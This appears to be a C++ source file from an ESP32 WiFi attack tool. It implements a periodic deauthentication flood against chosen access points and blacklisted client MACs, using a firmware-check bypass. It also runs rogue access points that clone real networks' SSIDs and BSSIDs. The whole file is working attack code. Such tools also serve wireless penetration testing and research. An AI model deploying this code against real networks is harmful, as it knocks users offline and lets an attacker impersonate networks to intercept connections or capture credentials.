/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <cstring>
#include <string>
#include <vector>

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "Timer.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi_types.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"

namespace {
const char* LOG_TAG = "main:attack_method";
constexpr uint8_t kMaxBLMacsPerIteration{20};

struct BroadcastAttackData {
  ap_records_t apRecords;

  std::vector<uint8_t> staionMacsBlackList;
  // These are indexes in apRecords and in staionMacsBlackList showing, where did we stop last time while sending
  // personalized deauth frames to APs from black list.
  // We can not send all personalized deauth frames every time when broadcast deauth is sent, because it requires too
  // high WiFi TX speed. Based on my tests we can safely process about 20 MACs from black list per second. The rest will
  // be processed next time when broadcast attack is activated (once per second by default)
  uint16_t currentBlApIdx{0};
  uint16_t currentBlMacIdx{0};
};
Timer gDeauthFrameSenderTimer;

struct RogueApAttackData {
  uint16_t current_ap_idx{0};
  ap_records_t ap_records;
};
Timer gRogueApTimer;
}  // namespace

extern bool gShouldLimitAttackLogs;

// For given AP sends deauth frame to all MACs in black list.
// Sending is started from MAC with index currentBlIdx
// Maximum amount of MACs that can be processed per one call of this function is maxBlMacsToBeProcessed
// Returns number of MACs which was processed
uint16_t sendDeauthToMacsForAp(const std::shared_ptr<const wifi_ap_record_t>& apRecord,
                               const std::vector<uint8_t>& staionMacsBlackList, uint16_t currentBlIdx,
                               uint16_t maxBlMacsToBeProcessed, const bool& isStopRequested) {
  const uint16_t blSize = staionMacsBlackList.size() / 6;
  uint16_t macsLeftForThisAP = blSize - currentBlIdx;
  uint16_t numOfMacsPerRequest = std::min(maxBlMacsToBeProcessed, macsLeftForThisAP);
  wsl_bypasser_send_deauth_frame_to_targets(apRecord.get(), staionMacsBlackList.data() + 6 * currentBlIdx,
                                            numOfMacsPerRequest, &isStopRequested);
  return numOfMacsPerRequest;
}

/**
 * @brief Callback for periodic deauthentication frame timer
 *
 * Periodicaly called to send deauthentication frame for given APs
 */
void send_deauth_frame(BroadcastAttackData& broadcastAttackData, const bool& isStopRequested) {
  std::string ap_ssids;
  for (const auto& ap_record : broadcastAttackData.apRecords) {
    ap_ssids += (const char*)ap_record->ssid;
    ap_ssids += ", ";
  }
  ap_ssids.pop_back();

  if (gShouldLimitAttackLogs) {
    static uint64_t cnt{0};
    if ((cnt % 60) == 0) {
      // Print log only once in 60 times (once per minute)
      ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
    }
    ++cnt;
  } else {
    ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
  }

  // Send all broadcast frames first
  for (const auto& ap_record : broadcastAttackData.apRecords) {
    wsl_bypasser_send_broadcast_deauth_frame(ap_record.get());
  }

  // Black list is empty
  if (broadcastAttackData.staionMacsBlackList.size() == 0) {
    return;
  }

  // Then process AP MAC black list.
  // Process maximum kMaxBLMacsPerIteration per one send_deauth_frame() call,
  // because ESP32 is very slow at sending raw TX frames
  uint8_t numOfApsToProcess = broadcastAttackData.apRecords.size();
  uint8_t numOfMacsToProcess = kMaxBLMacsPerIteration;
  while (numOfApsToProcess > 0) {
    if (isStopRequested) {
      return;
    }

    const auto& currentApRecord = broadcastAttackData.apRecords[broadcastAttackData.currentBlApIdx];
    auto numOfMacsProcessed =
        sendDeauthToMacsForAp(currentApRecord, broadcastAttackData.staionMacsBlackList,
                              broadcastAttackData.currentBlMacIdx, numOfMacsToProcess, isStopRequested);
    broadcastAttackData.currentBlMacIdx += numOfMacsProcessed;
    numOfMacsToProcess -= numOfMacsProcessed;
    if (broadcastAttackData.currentBlMacIdx < broadcastAttackData.staionMacsBlackList.size() / 6) {
      // Processed max possible num of MACs per this iteration. The rest MACs will be processed on next iteration
      break;
    }

    // We sent deauth frame to all MACs from black list for current AP. Swithch to next AP.
    broadcastAttackData.currentBlMacIdx = 0;

    --numOfApsToProcess;
    // Loop currentBlApIdx all over apRecords array
    ++broadcastAttackData.currentBlApIdx;
    if (broadcastAttackData.currentBlApIdx >= broadcastAttackData.apRecords.size()) {
      broadcastAttackData.currentBlApIdx = 0;
    }
  }
}

/**
 * @details Starts periodic timer for sending deauthentication frame
 */
void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec,
                             const MacContainer& staionMacsBlackList) {
  // Stop previous attack if it was not stopped yet
  gDeauthFrameSenderTimer.stop();

  BroadcastAttackData broadcastAttackData{};
  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
  broadcastAttackData.apRecords = ap_records;
  // Also copy all MACs from black list. So, adding new MACs will not affect/corrupt this attack
  broadcastAttackData.staionMacsBlackList = staionMacsBlackList.getStorage();

  // Call for the first time
  send_deauth_frame(broadcastAttackData, {false});

  gDeauthFrameSenderTimer.start(
      period_sec,
      [broadcastAttackData = std::move(broadcastAttackData)](const bool& isStopRequested) mutable {
        send_deauth_frame(broadcastAttackData, isStopRequested);
      },
      true);
}

void attack_method_broadcast_stop() { gDeauthFrameSenderTimer.stop(); }

/**
 * @details Starts offering new Rogue AP in the list
 */
void start_rogue_ap(const wifi_ap_record_t* ap_record) {
  ESP_LOGI(LOG_TAG, "Starting Rogue AP with SSID '%s'", ap_record->ssid);
  wifictl_set_ap_mac(ap_record->bssid);

  static const char dummyPassword[] = "dummypassword";
  wifi_config_t ap_config{};
  mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
  ap_config.ap.ssid_len = (uint8_t)strlen((char*)ap_record->ssid);
  mempcpy(ap_config.ap.password, dummyPassword, sizeof(dummyPassword));
  ap_config.ap.channel = ap_record->primary;
  ap_config.ap.authmode = ap_record->authmode;
  ap_config.ap.max_connection = 1;
  wifictl_ap_start(&ap_config);
}

/**
 * @brief Callback for periodic Rogue AP timer
 *
 * Periodicaly called to switch to new Rogue AP in the list
 */
void change_rogue_ap(RogueApAttackData& rogueApAttackData, const bool& isStopRequested) {
  const auto& current_wifi_ap_record_ptr = rogueApAttackData.ap_records[rogueApAttackData.current_ap_idx];
  ++rogueApAttackData.current_ap_idx;
  if (rogueApAttackData.current_ap_idx >= rogueApAttackData.ap_records.size()) {
    rogueApAttackData.current_ap_idx = 0;
  }
  start_rogue_ap(current_wifi_ap_record_ptr.get());
}

/**
 * @brief Starts attack with using multiple Rogue APs
 *
 * Starts periodic timer for switching to new Rogue AP in the list
 *
 * @param ap_records expects structure of type ap_records describing Rogue APs
 * @param per_ap_timeout how long to establish each Rogue AP
 */
void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
  RogueApAttackData rogueApAttackData{};
  rogueApAttackData.current_ap_idx = 0;
  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
  rogueApAttackData.ap_records = ap_records;

  // Call for the first time
  change_rogue_ap(rogueApAttackData, {false});

  gRogueApTimer.start(
      per_ap_timeout,
      [rogueApAttackData = std::move(rogueApAttackData)](const bool& isStopRequested) mutable {
        change_rogue_ap(rogueApAttackData, isStopRequested);
      },
      true);
}

/**
 * @brief Implenebts attack with using one or multiple Rogue APs
 *
 * Check if we should initiate attack on multiple or single AP. Initiates attack.
 *
 * @param ap_records expects structure of type ap_records describing Rogue APs
 * @param per_ap_timeout how long to establish each Rogue AP
 */
void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
  // Stop previous attack if it was not stopped yet
  gRogueApTimer.stop();

  if ((per_ap_timeout != 0) && (ap_records.size() > 1)) {
    // Attack multiple APs
    start_multiple_rogue_ap_attack(ap_records, per_ap_timeout);
    return;
  }

  start_rogue_ap(ap_records[0].get());
}

void attack_method_rogueap_stop() {
  gRogueApTimer.stop();
  wifictl_mgmt_ap_start();
  wifictl_restore_ap_mac();
}
